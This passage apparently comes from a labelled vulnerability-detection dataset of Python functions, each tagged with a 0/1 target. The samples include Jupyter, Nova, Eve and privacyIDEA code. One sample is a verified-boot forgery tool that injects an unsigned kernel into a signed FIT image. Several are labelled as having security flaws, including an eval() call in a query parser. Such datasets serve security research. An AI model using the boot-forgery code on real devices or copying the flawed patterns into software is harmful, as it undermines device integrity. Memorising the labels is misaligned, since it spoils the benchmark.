self.pulp_connection.cert_filename)\n            elif 'certificate verify failed' in str(err):\n                raise exceptions.CertificateVerificationException()\n            else:\n                raise exceptions.ConnectionException(None, str(err), None)\n\n        # Attempt to deserialize the body (should pass unless the server is busted)\n        response_body = response.read()\n\n        try:\n            response_body = json.loads(response_body)\n        except:\n            pass\n        return response.status, response_body\n", "target": 1}
{"idx": 979, "func": "\"\"\"Tornado handlers for kernel specifications.\"\"\"\n\n# Copyright (c) IPython Development Team.\n# Distributed under the terms of the Modified BSD License.\n\nimport glob\nimport json\nimport os\npjoin = os.path.join\n\nfrom tornado import web\n\nfrom ...base.handlers import IPythonHandler, json_errors\nfrom ...utils import url_path_join\n\ndef kernelspec_model(handler, name):\n    \"\"\"Load a KernelSpec by name and return the REST API model\"\"\"\n    ksm = handler.kernel_spec_manager\n    spec = ksm.get_kernel_spec(name)\n    d = {'name': name}\n    d['spec'] = spec.to_dict()\n    d['resources'] = resources = {}\n    resource_dir = spec.resource_dir\n    for resource in ['kernel.js', 'kernel.css']:\n        if os.path.exists(pjoin(resource_dir, resource)):\n            resources[resource] = url_path_join(\n                handler.base_url,\n                'kernelspecs',\n                name,\n                resource\n            )\n    for logo_file in glob.glob(pjoin(resource_dir, 'logo-*')):\n        fname = os.path.basename(logo_file)\n        no_ext, _ = os.path.splitext(fname)\n        resources[no_ext] = url_path_join(\n            handler.base_url,\n            'kernelspecs',\n            name,\n            fname\n        )\n    return d\n\nclass MainKernelSpecHandler(IPythonHandler):\n    SUPPORTED_METHODS = ('GET',)\n\n    @web.authenticated\n    @json_errors\n    def get(self):\n        ksm = self.kernel_spec_manager\n        km = self.kernel_manager\n        model = {}\n        model['default'] = km.default_kernel_name\n        model['kernelspecs'] = specs = {}\n        for kernel_name in ksm.find_kernel_specs():\n            try:\n                d = kernelspec_model(self, kernel_name)\n            except Exception:\n                self.log.error(\"Failed to load kernel spec: '%s'\", kernel_name, exc_info=True)\n                continue\n            specs[kernel_name] = d\n        self.set_header(\"Content-Type\", 'application/json')\n        self.finish(json.dumps(model))\n\n\nclass KernelSpecHandler(IPythonHandler):\n    SUPPORTED_METHODS = ('GET',)\n\n    @web.authenticated\n    @json_errors\n    def get(self, kernel_name):\n        try:\n            model = kernelspec_model(self, kernel_name)\n        except KeyError:\n            raise web.HTTPError(404, u'Kernel spec %s not found' % kernel_name)\n        self.set_header(\"Content-Type\", 'application/json')\n        self.finish(json.dumps(model))\n\n\n# URL to handler mappings\n\nkernel_name_regex = r\"(?P<kernel_name>\\w+)\"\n\ndefault_handlers = [\n    (r\"/api/kernelspecs\", MainKernelSpecHandler),\n    (r\"/api/kernelspecs/%s\" % kernel_name_regex, KernelSpecHandler),\n]\n", "target": 1}
{"idx": 980, "func": "#!/usr/bin/python3\n# SPDX-License-Identifier: GPL-2.0\n# Copyright (c) 2020, F-Secure Corporation, https://foundry.f-secure.com\n#\n# pylint: disable=E1101,W0201,C0103\n\n\"\"\"\nVerified boot image forgery tools and utilities\n\nThis module provides services to both take apart and regenerate FIT images\nin a way that preserves all existing verified boot signatures, unless you\nmanipulate nodes in the process.\n\"\"\"\n\nimport struct\nimport binascii\nfrom io import BytesIO\n\n#\n# struct parsing helpers\n#\n\nclass BetterStructMeta(type):\n    \"\"\"\n    Preprocesses field definitions and creates a struct.Struct instance from them\n    \"\"\"\n    def __new__(cls, clsname, superclasses, attributedict):\n        if clsname != 'BetterStruct':\n            fields = attributedict['__fields__']\n            field_types = [_[0] for _ in fields]\n            field_names = [_[1] for _ in fields if _[1] is not None]\n            attributedict['__names__'] = field_names\n            s = struct.Struct(attributedict.get('__endian__', '') + ''.join(field_types))\n            attributedict['__struct__'] = s\n            attributedict['size'] = s.size\n        return type.__new__(cls, clsname, superclasses, attributedict)\n\nclass BetterStruct(metaclass=BetterStructMeta):\n    \"\"\"\n    Base class for better structures\n    \"\"\"\n    def __init__(self):\n        for t, n in self.__fields__:\n            if 's' in t:\n                setattr(self, n, '')\n            elif t in ('Q', 'I', 'H', 'B'):\n                setattr(self, n, 0)\n\n    @classmethod\n    def unpack_from(cls, buffer, offset=0):\n        \"\"\"\n        Unpack structure instance from a buffer\n        \"\"\"\n        fields = cls.__struct__.unpack_from(buffer, offset)\n        instance = cls()\n        for n, v in zip(cls.__names__, fields):\n            setattr(instance, n, v)\n        return instance\n\n    def pack(self):\n        \"\"\"\n        Pack structure instance into bytes\n        \"\"\"\n        return self.__struct__.pack(*[getattr(self, n) for n in self.__names__])\n\n    def __str__(self):\n        items = [\"'%s': %s\" % (n, repr(getattr(self, n))) for n in self.__names__ if n is not None]\n        return '(' + ', '.join(items) + ')'\n\n#\n# some defs for flat DT data\n#\n\nclass HeaderV17(BetterStruct):\n    __endian__ = '>'\n    __fields__ = [\n        ('I', 'magic'),\n        ('I', 'totalsize'),\n        ('I', 'off_dt_struct'),\n        ('I', 'off_dt_strings'),\n        ('I', 'off_mem_rsvmap'),\n        ('I', 'version'),\n        ('I', 'last_comp_version'),\n        ('I', 'boot_cpuid_phys'),\n        ('I', 'size_dt_strings'),\n        ('I', 'size_dt_struct'),\n    ]\n\nclass RRHeader(BetterStruct):\n    __endian__ = '>'\n    __fields__ = [\n        ('Q', 'address'),\n        ('Q', 'size'),\n    ]\n\nclass PropHeader(BetterStruct):\n    __endian__ = '>'\n    __fields__ = [\n        ('I', 'value_size'),\n        ('I', 'name_offset'),\n    ]\n\n# magical constants for DTB format\nOF_DT_HEADER = 0xd00dfeed\nOF_DT_BEGIN_NODE = 1\nOF_DT_END_NODE = 2\nOF_DT_PROP = 3\nOF_DT_END = 9\n\nclass StringsBlock:\n    \"\"\"\n    Represents a parsed device tree string block\n    \"\"\"\n    def __init__(self, values=None):\n        if values is None:\n            self.values = []\n        else:\n            self.values = values\n\n    def __getitem__(self, at):\n        if isinstance(at, str):\n            offset = 0\n            for value in self.values:\n                if value == at:\n                    break\n                offset += len(value) + 1\n            else:\n                self.values.append(at)\n            return offset\n\n        if isinstance(at, int):\n            offset = 0\n            for value in self.values:\n                if offset == at:\n                    return value\n                offset += len(value) + 1\n            raise IndexError('no string found corresponding to the given offset')\n\n        raise TypeError('only strings and integers are accepted')\n\nclass Prop:\n    \"\"\"\n    Represents a parsed device tree property\n    \"\"\"\n    def __init__(self, name=None, value=None):\n        self.name = name\n        self.value = value\n\n    def clone(self):\n        return Prop(self.name, self.value)\n\n    def __repr__(self):\n        return \"<Prop(name='%s', value=%s>\" % (self.name, repr(self.value))\n\nclass Node:\n    \"\"\"\n    Represents a parsed device tree node\n    \"\"\"\n    def __init__(self, name=None):\n        self.name = name\n        self.props = []\n        self.children = []\n\n    def clone(self):\n        o = Node(self.name)\n        o.props = [x.clone() for x in self.props]\n        o.children = [x.clone() for x in self.children]\n        return o\n\n    def __getitem__(self, index):\n        return self.children[index]\n\n    def __repr__(self):\n        return \"<Node('%s'), %s, %s>\" % (self.name, repr(self.props), repr(self.children))\n\n#\n# flat DT to memory\n#\n\ndef parse_strings(strings):\n    \"\"\"\n    Converts the bytes into a StringsBlock instance so it is convenient to work with\n    \"\"\"\n    strings = strings.split(b'\\x00')\n    return StringsBlock(strings)\n\ndef parse_struct(stream):\n    \"\"\"\n    Parses DTB structure(s) into a Node or Prop instance\n    \"\"\"\n    tag = bytearray(stream.read(4))[3]\n    if tag == OF_DT_BEGIN_NODE:\n        name = b''\n        while b'\\x00' not in name:\n            name += stream.read(4)\n        name = name.rstrip(b'\\x00')\n        node = Node(name)\n\n        item = parse_struct(stream)\n        while item is not None:\n            if isinstance(item, Node):\n                node.children.append(item)\n            elif isinstance(item, Prop):\n                node.props.append(item)\n            item = parse_struct(stream)\n\n        return node\n\n    if tag == OF_DT_PROP:\n        h = PropHeader.unpack_from(stream.read(PropHeader.size))\n        length = (h.value_size + 3) & (~3)\n        value = stream.read(length)[:h.value_size]\n        prop = Prop(h.name_offset, value)\n        return prop\n\n    if tag in (OF_DT_END_NODE, OF_DT_END):\n        return None\n\n    raise ValueError('unexpected tag value')\n\ndef read_fdt(fp):\n    \"\"\"\n    Reads and parses the flattened device tree (or derivatives like FIT)\n    \"\"\"\n    header = HeaderV17.unpack_from(fp.read(HeaderV17.size))\n    if header.magic != OF_DT_HEADER:\n        raise ValueError('invalid magic value %08x; expected %08x' % (header.magic, OF_DT_HEADER))\n    # TODO: read/parse reserved regions\n    fp.seek(header.off_dt_struct)\n    structs = fp.read(header.size_dt_struct)\n    fp.seek(header.off_dt_strings)\n    strings = fp.read(header.size_dt_strings)\n    strblock = parse_strings(strings)\n    root = parse_struct(BytesIO(structs))\n\n    return root, strblock\n\n#\n# memory to flat DT\n#\n\ndef compose_structs_r(item):\n    \"\"\"\n    Recursive part of composing Nodes and Props into a bytearray\n    \"\"\"\n    t = bytearray()\n\n    if isinstance(item, Node):\n        t.extend(struct.pack('>I', OF_DT_BEGIN_NODE))\n        if isinstance(item.name, str):\n            item.name = bytes(item.name, 'utf-8')\n        name = item.name + b'\\x00'\n        if len(name) & 3:\n            name += b'\\x00' * (4 - (len(name) & 3))\n        t.extend(name)\n        for p in item.props:\n            t.extend(compose_structs_r(p))\n        for c in item.children:\n            t.extend(compose_structs_r(c))\n        t.extend(struct.pack('>I', OF_DT_END_NODE))\n\n    elif isinstance(item, Prop):\n        t.extend(struct.pack('>I', OF_DT_PROP))\n        value = item.value\n        h = PropHeader()\n        h.name_offset = item.name\n        if value:\n            h.value_size = len(value)\n            t.extend(h.pack())\n            if len(value) & 3:\n                value += b'\\x00' * (4 - (len(value) & 3))\n            t.extend(value)\n        else:\n            h.value_size = 0\n            t.extend(h.pack())\n\n    return t\n\ndef compose_structs(root):\n    \"\"\"\n    Composes the parsed Nodes into a flat bytearray instance\n    \"\"\"\n    t = compose_structs_r(root)\n    t.extend(struct.pack('>I', OF_DT_END))\n    return t\n\ndef compose_strings(strblock):\n    \"\"\"\n    Composes the StringsBlock instance back into a bytearray instance\n    \"\"\"\n    b = bytearray()\n    for s in strblock.values:\n        b.extend(s)\n        b.append(0)\n    return bytes(b)\n\ndef write_fdt(root, strblock, fp):\n    \"\"\"\n    Writes out a complete flattened device tree (or FIT)\n    \"\"\"\n    header = HeaderV17()\n    header.magic = OF_DT_HEADER\n    header.version = 17\n    header.last_comp_version = 16\n    fp.write(header.pack())\n\n    header.off_mem_rsvmap = fp.tell()\n    fp.write(RRHeader().pack())\n\n    structs = compose_structs(root)\n    header.off_dt_struct = fp.tell()\n    header.size_dt_struct = len(structs)\n    fp.write(structs)\n\n    strings = compose_strings(strblock)\n    header.off_dt_strings = fp.tell()\n    header.size_dt_strings = len(strings)\n    fp.write(strings)\n\n    header.totalsize = fp.tell()\n\n    fp.seek(0)\n    fp.write(header.pack())\n\n#\n# pretty printing / converting to DT source\n#\n\ndef as_bytes(value):\n    return ' '.join([\"%02X\" % x for x in value])\n\ndef prety_print_value(value):\n    \"\"\"\n    Formats a property value as appropriate depending on the guessed data type\n    \"\"\"\n    if not value:\n        return '\"\"'\n    if value[-1] == b'\\x00':\n        printable = True\n        for x in value[:-1]:\n            x = ord(x)\n            if x != 0 and (x < 0x20 or x > 0x7F):\n                printable = False\n                break\n        if printable:\n            value = value[:-1]\n            return ', '.join('\"' + x + '\"' for x in value.split(b'\\x00'))\n    if len(value) > 0x80:\n        return '[' + as_bytes(value[:0x80]) + ' ... ]'\n    return '[' + as_bytes(value) + ']'\n\ndef pretty_print_r(node, strblock, indent=0):\n    \"\"\"\n    Prints out a single node, recursing further for each of its children\n    \"\"\"\n    spaces = '  ' * indent\n    print((spaces + '%s {' % (node.name.decode('utf-8') if node.name else '/')))\n    for p in node.props:\n        print((spaces + '  %s = %s;' % (strblock[p.name].decode('utf-8'), prety_print_value(p.value))))\n    for c in node.children:\n        pretty_print_r(c, strblock, indent+1)\n    print((spaces + '};'))\n\ndef pretty_print(node, strblock):\n    \"\"\"\n    Generates an almost-DTS formatted printout of the parsed device tree\n    \"\"\"\n    print('/dts-v1/;')\n    pretty_print_r(node, strblock, 0)\n\n#\n# manipulating the DT structure\n#\n\ndef manipulate(root, strblock):\n    \"\"\"\n    Maliciously manipulates the structure to create a crafted FIT file\n    \"\"\"\n    # locate /images/kernel-1 (frankly, it just expects it to be the first one)\n    kernel_node = root[0][0]\n    # clone it to save time filling all the properties\n    fake_kernel = kernel_node.clone()\n    # rename the node\n    fake_kernel.name = b'kernel-2'\n    # get rid of signatures/hashes\n    fake_kernel.children = []\n    # NOTE: this simply replaces the first prop... either description or data\n    # should be good for testing purposes\n    fake_kernel.props[0].value = b'Super 1337 kernel\\x00'\n    # insert the new kernel node under /images\n    root[0].children.append(fake_kernel)\n\n    # modify the default configuration\n    root[1].props[0].value = b'conf-2\\x00'\n    # clone the first (only?) configuration\n    fake_conf = root[1][0].clone()\n    # rename and change kernel and fdt properties to select the crafted kernel\n    fake_conf.name = b'conf-2'\n    fake_conf.props[0].value = b'kernel-2\\x00'\n    fake_conf.props[1].value = b'fdt-1\\x00'\n    # insert the new configuration under /configurations\n    root[1].children.append(fake_conf)\n\n    return root, strblock\n\ndef main(argv):\n    with open(argv[1], 'rb') as fp:\n        root, strblock = read_fdt(fp)\n\n    print(\"Before:\")\n    pretty_print(root, strblock)\n\n    root, strblock = manipulate(root, strblock)\n    print(\"After:\")\n    pretty_print(root, strblock)\n\n    with open('blah', 'w+b') as fp:\n        write_fdt(root, strblock, fp)\n\nif __name__ == '__main__':\n    import sys\n    main(sys.argv)\n# EOF\n", "target": 0}
{"idx": 981, "func": "# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright 2010 United States Government as represented by the\n# Administrator of the National Aeronautics and Space Administration.\n# All Rights Reserved.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\n\"\"\"Quotas for instances, volumes, and floating ips.\"\"\"\n\nfrom nova import db\nfrom nova.openstack.common import cfg\nfrom nova import flags\n\n\nquota_opts = [\n    cfg.IntOpt('quota_instances',\n               default=10,\n               help='number of instances allowed per project'),\n    cfg.IntOpt('quota_cores',\n               default=20,\n               help='number of instance cores allowed per project'),\n    cfg.IntOpt('quota_ram',\n               default=50 * 1024,\n               help='megabytes of instance ram allowed per project'),\n    cfg.IntOpt('quota_volumes',\n               default=10,\n               help='number of volumes allowed per project'),\n    cfg.IntOpt('quota_gigabytes',\n               default=1000,\n               help='number of volume gigabytes allowed per project'),\n    cfg.IntOpt('quota_floating_ips',\n               default=10,\n               help='number of floating ips allowed per project'),\n    cfg.IntOpt('quota_metadata_items',\n               default=128,\n               help='number of metadata items allowed per instance'),\n    cfg.IntOpt('quota_max_injected_files',\n               default=5,\n               help='number of injected files allowed'),\n    cfg.IntOpt('quota_max_injected_file_content_bytes',\n               default=10 * 1024,\n               help='number of bytes allowed per injected file'),\n    cfg.IntOpt('quota_max_injected_file_path_bytes',\n               default=255,\n               help='number of bytes allowed per injected file path'),\n    ]\n\nFLAGS = flags.FLAGS\nFLAGS.register_opts(quota_opts)\n\n\ndef _get_default_quotas():\n    defaults = {\n        'instances': FLAGS.quota_instances,\n        'cores': FLAGS.quota_cores,\n        'ram': FLAGS.quota_ram,\n        'volumes': FLAGS.quota_volumes,\n        'gigabytes': FLAGS.quota_gigabytes,\n        'floating_ips': FLAGS.quota_floating_ips,\n        'metadata_items': FLAGS.quota_metadata_items,\n        'injected_files': FLAGS.quota_max_injected_files,\n        'injected_file_content_bytes':\n            FLAGS.quota_max_injected_file_content_bytes,\n    }\n    # -1 in the quota flags means unlimited\n    for key in defaults.keys():\n        if defaults[key] == -1:\n            defaults[key] = None\n    return defaults\n\n\ndef get_project_quotas(context, project_id):\n    rval = _get_default_quotas()\n    quota = db.quota_get_all_by_project(context, project_id)\n    for key in rval.keys():\n        if key in quota:\n            rval[key] = quota[key]\n    return rval\n\n\ndef _get_request_allotment(requested, used, quota):\n    if quota is None:\n        return requested\n    return quota - used\n\n\ndef allowed_instances(context, requested_instances, instance_type):\n    \"\"\"Check quota and return min(requested_instances, allowed_instances).\"\"\"\n    project_id = context.project_id\n    context = context.elevated()\n    requested_cores = requested_instances * instance_type['vcpus']\n    requested_ram = requested_instances * instance_type['memory_mb']\n    usage = db.instance_data_get_for_project(context, project_id)\n    used_instances, used_cores, used_ram = usage\n    quota = get_project_quotas(context, project_id)\n    allowed_instances = _get_request_allotment(requested_instances,\n                                               used_instances,\n                                               quota['instances'])\n    allowed_cores = _get_request_allotment(requested_cores, used_cores,\n                                           quota['cores'])\n    allowed_ram = _get_request_allotment(requested_ram, used_ram, quota['ram'])\n    if instance_type['vcpus']:\n        allowed_instances = min(allowed_instances,\n                                allowed_cores // instance_type['vcpus'])\n    if instance_type['memory_mb']:\n        allowed_instances = min(allowed_instances,\n                                allowed_ram // instance_type['memory_mb'])\n\n    return min(requested_instances, allowed_instances)\n\n\ndef allowed_volumes(context, requested_volumes, size):\n    \"\"\"Check quota and return min(requested_volumes, allowed_volumes).\"\"\"\n    project_id = context.project_id\n    context = context.elevated()\n    size = int(size)\n    requested_gigabytes = requested_volumes * size\n    used_volumes, used_gigabytes = db.volume_data_get_for_project(context,\n                                                                  project_id)\n    quota = get_project_quotas(context, project_id)\n    allowed_volumes = _get_request_allotment(requested_volumes, used_volumes,\n                                             quota['volumes'])\n    allowed_gigabytes = _get_request_allotment(requested_gigabytes,\n                                               used_gigabytes,\n                                               quota['gigabytes'])\n    if size != 0:\n        allowed_volumes = min(allowed_volumes,\n                              int(allowed_gigabytes // size))\n    return min(requested_volumes, allowed_volumes)\n\n\ndef allowed_floating_ips(context, requested_floating_ips):\n    \"\"\"Check quota and return min(requested, allowed) floating ips.\"\"\"\n    project_id = context.project_id\n    context = context.elevated()\n    used_floating_ips = db.floating_ip_count_by_project(context, project_id)\n    quota = get_project_quotas(context, project_id)\n    allowed_floating_ips = _get_request_allotment(requested_floating_ips,\n                                                  used_floating_ips,\n                                                  quota['floating_ips'])\n    return min(requested_floating_ips, allowed_floating_ips)\n\n\ndef _calculate_simple_quota(context, resource, requested):\n    \"\"\"Check quota for resource; return min(requested, allowed).\"\"\"\n    quota = get_project_quotas(context, context.project_id)\n    allowed = _get_request_allotment(requested, 0, quota[resource])\n    return min(requested, allowed)\n\n\ndef allowed_metadata_items(context, requested_metadata_items):\n    \"\"\"Return the number of metadata items allowed.\"\"\"\n    return _calculate_simple_quota(context, 'metadata_items',\n                                   requested_metadata_items)\n\n\ndef allowed_injected_files(context, requested_injected_files):\n    \"\"\"Return the number of injected files allowed.\"\"\"\n    return _calculate_simple_quota(context, 'injected_files',\n                                   requested_injected_files)\n\n\ndef allowed_injected_file_content_bytes(context, requested_bytes):\n    \"\"\"Return the number of bytes allowed per injected file content.\"\"\"\n    resource = 'injected_file_content_bytes'\n    return _calculate_simple_quota(context, resource, requested_bytes)\n\n\ndef allowed_injected_file_path_bytes(context):\n    \"\"\"Return the number of bytes allowed in an injected file path.\"\"\"\n    return FLAGS.quota_max_injected_file_path_bytes\n", "target": 1}
{"idx": 982, "func": "# -*- coding: utf-8 -*-\n\n\"\"\"\n    eve.io.mongo.parser\n    ~~~~~~~~~~~~~~~~~~~\n\n    This module implements a Python-to-Mongo syntax parser. Allows the MongoDB\n    data-layer to seamlessly respond to a Python-like query.\n\n    :copyright: (c) 2017 by Nicola Iarocci.\n    :license: BSD, see LICENSE for more details.\n\"\"\"\n\nimport ast\nimport sys\nfrom datetime import datetime   # noqa\nfrom bson import ObjectId       # noqa\n\n\ndef parse(expression):\n    \"\"\" Given a python-like conditional statement, returns the equivalent\n    mongo-like query expression. Conditional and boolean operators (==, <=, >=,\n    !=, >, <) along with a couple function calls (ObjectId(), datetime()) are\n    supported.\n    \"\"\"\n    v = MongoVisitor()\n    try:\n        v.visit(ast.parse(expression))\n    except SyntaxError as e:\n        e = ParseError(e)\n        e.__traceback__ = sys.exc_info()[2]\n        raise e\n    return v.mongo_query\n\n\nclass ParseError(ValueError):\n    pass\n\n\nclass MongoVisitor(ast.NodeVisitor):\n    \"\"\" Implements the python-to-mongo parser. Only Python conditional\n    statements are supported, however nested, combined with most common compare\n    and boolean operators (And and Or).\n\n    Supported compare operators: ==, >, <, !=, >=, <=\n    Supported boolean operators: And, Or\n    \"\"\"\n    op_mapper = {\n        ast.Eq: '',\n        ast.Gt: '$gt',\n        ast.GtE: '$gte',\n        ast.Lt: '$lt',\n        ast.LtE: '$lte',\n        ast.NotEq: '$ne',\n        ast.Or: '$or',\n        ast.And: '$and'\n    }\n\n    def visit_Module(self, node):\n        \"\"\" Module handler, our entry point.\n        \"\"\"\n        self.mongo_query = {}\n        self.ops = []\n        self.current_value = None\n\n        # perform the magic.\n        self.generic_visit(node)\n\n        # if we didn't obtain a query, it is likely that an unsupported\n        # python expression has been passed.\n        if self.mongo_query == {}:\n            raise ParseError(\"Only conditional statements with boolean \"\n                             \"(and, or) and comparison operators are \"\n                             \"supported.\")\n\n    def visit_Expr(self, node):\n        \"\"\" Make sure that we are parsing compare or boolean operators\n        \"\"\"\n        if not (isinstance(node.value, ast.Compare) or\n                isinstance(node.value, ast.BoolOp)):\n            raise ParseError(\"Will only parse conditional statements\")\n        self.generic_visit(node)\n\n    def visit_Compare(self, node):\n        \"\"\" Compare operator handler.\n        \"\"\"\n        self.visit(node.left)\n        left = self.current_value\n\n        operator = self.op_mapper[node.ops[0].__class__] if node.ops else None\n\n        if node.comparators:\n            comparator = node.comparators[0]\n            self.visit(comparator)\n\n        if operator != '':\n            value = {operator: self.current_value}\n        else:\n            value = self.current_value\n\n        if self.ops:\n            self.ops[-1].append({left: value})\n        else:\n            self.mongo_query[left] = value\n\n    def visit_BoolOp(self, node):\n        \"\"\" Boolean operator handler.\n        \"\"\"\n        op = self.op_mapper[node.op.__class__]\n        self.ops.append([])\n        for value in node.values:\n            self.visit(value)\n\n        c = self.ops.pop()\n        if self.ops:\n            self.ops[-1].append({op: c})\n        else:\n            self.mongo_query[op] = c\n\n    def visit_Call(self, node):\n        \"\"\" A couple function calls are supported: bson's ObjectId() and\n        datetime().\n        \"\"\"\n        if isinstance(node.func, ast.Name):\n            expr = None\n            if node.func.id == 'ObjectId':\n                expr = \"('\" + node.args[0].s + \"')\"\n            elif node.func.id == 'datetime':\n                values = []\n                for arg in node.args:\n                    values.append(str(arg.n))\n                expr = \"(\" + \", \".join(values) + \")\"\n            if expr:\n                self.current_value = eval(node.func.id + expr)\n\n    def visit_Attribute(self, node):\n        \"\"\" Attribute handler ('Contact.Id').\n        \"\"\"\n        self.visit(node.value)\n        self.current_value += \".\" + node.attr\n\n    def visit_Name(self, node):\n        \"\"\" Names handler.\n        \"\"\"\n        self.current_value = node.id\n\n    def visit_Num(self, node):\n        \"\"\" Numbers handler.\n        \"\"\"\n        self.current_value = node.n\n\n    def visit_Str(self, node):\n        \"\"\" Strings handler.\n        \"\"\"\n        self.current_value = node.s\n", "target": 1}
{"idx": 983, "func": "# -*- coding: utf-8 -*-\n#\n# privacyIDEA documentation build configuration file, created by\n# sphinx-quickstart on Fri Jun 13 07:31:01 2014.\n#\n# This file is execfile()d with the current directory set to its containing dir.\n#\n# Note that not all possible configuration values are present in this\n# autogenerated file.\n#\n# All configuration values have a default; values that are commented out\n# serve to show the default.\n\n\n# The version info for the project you're documenting, acts as replacement for\n# |version| and |release|, also used in various other places throughout the\n# built documents.\n#\n# The short X.Y version.\nversion = '2.23.2'\n# The full version, including alpha/beta/rc tags.\n#release = '2.16dev5'\nrelease = version\n\n\nimport sys\nimport os\nfrom mock import Mock as MagicMock\n\nclass Mock(MagicMock):\n    @classmethod\n    def __getattr__(cls, name):\n            return MagicMock()\n\n#MOCK_MODULES = ['pandas', 'pyOpenSSL']\nMOCK_MODULES = []\nsys.modules.update((mod_name, Mock()) for mod_name in MOCK_MODULES)\n\n\n# Monkey-patch functools.wraps\n# http://stackoverflow.com/questions/28366818/preserve-default-arguments-of-wrapped-decorated-python-function-in-sphinx-docume\nimport functools\n\ndef no_op_wraps(func):\n    \"\"\"Replaces functools.wraps in order to undo wrapping.\n\n    Can be used to preserve the decorated function's signature\n    in the documentation generated by Sphinx.\n\n    \"\"\"\n    def wrapper(decorator):\n        return func\n    return wrapper\n\nfunctools.wraps = no_op_wraps\n\n# If extensions (or modules to document with autodoc) are in another directory,\n# add these directories to sys.path here. If the directory is relative to the\n# documentation root, use os.path.abspath to make it absolute, like shown here.\nsys.path.insert(0, os.path.abspath('..'))\nsys.path.append(os.path.abspath('_themes/flask-sphinx-themes'))\nsys.path.insert(0, os.path.abspath('../privacyidea'))\n\n# -- General configuration -----------------------------------------------------\n\n# If your documentation needs a minimal Sphinx version, state it here.\n#needs_sphinx = '1.0'\n\n# Add any Sphinx extension module names here, as strings. They can be extensions\n# coming with Sphinx (named 'sphinx.ext.*') or your custom ones.\nextensions = ['sphinx.ext.autodoc', 'sphinx.ext.imgmath', 'sphinx.ext.viewcode', \n              'sphinxcontrib.autohttp.flask']\nhttp_index_ignore_prefixes = ['/token']\n\n# Add any paths that contain templates here, relative to this directory.\ntemplates_path = ['_templates']\n\n# The suffix of source filenames.\nsource_suffix = '.rst'\n\n# The encoding of source files.\n#source_encoding = 'utf-8-sig'\n\n# The master toctree document.\nmaster_doc = 'index'\n\n# General information about the project.\nproject = u'privacyIDEA'\ncopyright = u'2014-2017, Cornelius K\u00f6lbel'\n\n# The language for content autogenerated by Sphinx. Refer to documentation\n# for a list of supported languages.\n#language = None\n\n# There are two options for replacing |today|: either, you set today to some\n# non-false value, then it is used:\n#today = ''\n# Else, today_fmt is used as the format for a strftime call.\n#today_fmt = '%B %d, %Y'\n\n# List of patterns, relative to source directory, that match files and\n# directories to ignore when looking for source files.\nexclude_patterns = ['_build']\n\n# The reST default role (used for this markup: `text`) to use for all documents.\n#default_role = None\n\n# If true, '()' will be appended to :func: etc. cross-reference text.\nadd_function_parentheses = True\n\n# If true, the current module name will be prepended to all description\n# unit titles (such as .. function::).\n#add_module_names = True\n\n# If true, sectionauthor and moduleauthor directives will be shown in the\n# output. They are ignored by default.\n#show_authors = False\n\n# The name of the Pygments (syntax highlighting) style to use.\npygments_style = 'sphinx'\n\n# A list of ignored prefixes for module index sorting.\n#modindex_common_prefix = []\n\n\n# -- Options for HTML output ---------------------------------------------------\n\n# The theme to use for HTML and HTML Help pages.  See the documentation for\n# a list of builtin themes.\n#html_theme = 'sphinxdoc'\n#html_theme = 'sphinx_rtd_theme'\n#html_theme = 'agogo'\nhtml_theme = 'flask'\n\n# Theme options are theme-specific and customize the look and feel of a theme\n# further.  For a list of options available for each theme, see the\n# documentation.\n#html_theme_options = {}\n\n# Add any paths that contain custom themes here, relative to this directory.\nhtml_theme_path = ['_themes/flask-sphinx-themes']\n\n\n# The name for this set of Sphinx documents.  If None, it defaults to\n# \"<project> v<release> documentation\".\n#html_title = None\n\n# A shorter title for the navigation bar.  Default is the same as html_title.\n#html_short_title = None\n\n# The name of an image file (relative to this directory) to place at the top\n# of the sidebar.\nhtml_logo = \"images/privacyidea-color.png\"\n\n# The name of an image file (within the static path) to use as favicon of the\n# docs.  This file should be a Windows icon file (.ico) being 16x16 or 32x32\n# pixels large.\n#html_favicon = None\n\n# Add any paths that contain custom static files (such as style sheets) here,\n# relative to this directory. They are copied after the builtin static files,\n# so a file named \"default.css\" will overwrite the builtin \"default.css\".\nhtml_static_path = ['_static']\n\n# If not '', a 'Last updated on:' timestamp is inserted at every page bottom,\n# using the given strftime format.\n#html_last_updated_fmt = '%b %d, %Y'\n\n# If true, SmartyPants will be used to convert quotes and dashes to\n# typographically correct entities.\n#html_use_smartypants = True\n\n# Custom sidebar templates, maps document names to template names.\n#html_sidebars = {}\n\n# Additional templates that should be rendered to pages, maps page names to\n# template names.\n#html_additional_pages = {}\n\n# If false, no module index is generated.\n#html_domain_indices = True\n\n# If false, no index is generated.\n#html_use_index = True\n\n# If true, the index is split into individual pages for each letter.\n#html_split_index = False\n\n# If true, links to the reST sources are added to the pages.\n#html_show_sourcelink = True\n\n# If true, \"Created using Sphinx\" is shown in the HTML footer. Default is True.\n#html_show_sphinx = True\n\n# If true, \"(C) Copyright ...\" is shown in the HTML footer. Default is True.\n#html_show_copyright = True\n\n# If true, an OpenSearch description file will be output, and all pages will\n# contain a <link> tag referring to it.  The value of this option must be the\n# base URL from which the finished HTML is served.\n#html_use_opensearch = ''\n\n# This is the file name suffix for HTML files (e.g. \".xhtml\").\n#html_file_suffix = None\n\n# Output file base name for HTML help builder.\nhtmlhelp_basename = 'privacyIDEAdoc'\n\n\n# -- Options for LaTeX output --------------------------------------------------\n\nlatex_elements = {\n# The paper size ('letterpaper' or 'a4paper').\n#'papersize': 'letterpaper',\n\n# The font size ('10pt', '11pt' or '12pt').\n#'pointsize': '10pt',\n\n# Additional stuff for the LaTeX preamble.\n#'preamble': '',\n}\n\n# Grouping the document tree into LaTeX files. List of tuples\n# (source start file, target name, title, author, documentclass [howto/manual]).\nlatex_documents = [\n  ('index', 'privacyIDEA.tex', u'privacyIDEA Authentication System',\n   u'Cornelius K\u00f6lbel', 'manual'),\n]\n\n# The name of an image file (relative to this directory) to place at the top of\n# the title page.\n#latex_logo = None\n\n# For \"manual\" documents, if this is true, then toplevel headings are parts,\n# not chapters.\n#latex_use_parts = False\n\n# If true, show page references after internal links.\n#latex_show_pagerefs = False\n\n# If true, show URL addresses after external links.\n#latex_show_urls = False\n\n# Documents to append as an appendix to all 